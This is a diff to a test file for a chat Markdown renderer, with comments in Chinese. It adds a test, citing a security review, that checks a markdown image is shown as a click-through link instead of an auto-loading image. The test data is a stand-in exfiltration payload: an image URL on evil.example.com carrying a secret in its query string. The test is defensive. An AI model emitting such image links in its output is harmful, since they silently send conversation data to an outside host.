@@ -19,6 +19,16 @@ describe('Markdown 安全', () => {
         expect(a?.getAttribute('href') ?? '').not.toMatch(/javascript:/i);
     });
 
+    // 安全审查 M7：![](https://evil/?q=<对话内容>) 一渲染就自动请求，等于把对话外带出去
+    it('图片不自动加载，只渲染成需要点击的链接', () => {
+        const { container } = render(<MarkdownRenderer text="![订单截图](https://evil.example.com/x.png?q=secret)" />);
+        expect(container.querySelector('img')).toBeNull();
+        const a = container.querySelector('a')!;
+        expect(a.getAttribute('href')).toBe('https://evil.example.com/x.png?q=secret');
+        expect(a.getAttribute('rel')).toBe('noopener noreferrer');
+        expect(a.textContent).toBe('查看图片：订单截图');
+    });
+
     it('http(s) 链接新窗口打开且不带 opener', () => {
         const { container } = render(<MarkdownRenderer text="[帮助](https://help.example.com)" />);
         const a = container.querySelector('a')!;
